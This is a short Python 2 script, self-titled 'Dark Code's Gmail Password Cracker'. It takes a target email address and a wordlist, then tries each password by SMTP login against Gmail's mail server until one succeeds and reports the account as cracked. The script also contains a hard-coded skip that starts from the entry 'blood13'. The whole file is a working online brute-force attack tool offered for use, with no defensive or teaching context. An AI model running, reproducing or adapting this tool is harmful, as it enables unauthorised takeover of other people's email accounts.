import smtplib
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-t", '--target', help='Target')
parser.add_argument("-f", '--file', help='Password File')
args = parser.parse_args()

stop = False

if args.target and args.file:
    stop = True
    print 'Dark Code\'s Gmail Password Cracker'
    passwordfile = open(args.file, 'r')
    
    counter = 0
    flag = False
    for line in passwordfile:
        counter += 1

        if flag == False and line.strip() == 'blood13':
            flag = True
        if flag == False:
            continue

        print 'Counter %s : Attempting Password:' % counter, line
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()

        try: 
                server.login(args.target, line)
                print '[!] Account Cracked, Password', line
                a = raw_input()
                exit()
        except smtplib.SMTPAuthenticationError:
                pass

if '__main__' == __name__:
    if stop == False:
        print "The corrent syntex is python script.py -t <target> -f <passfile>"
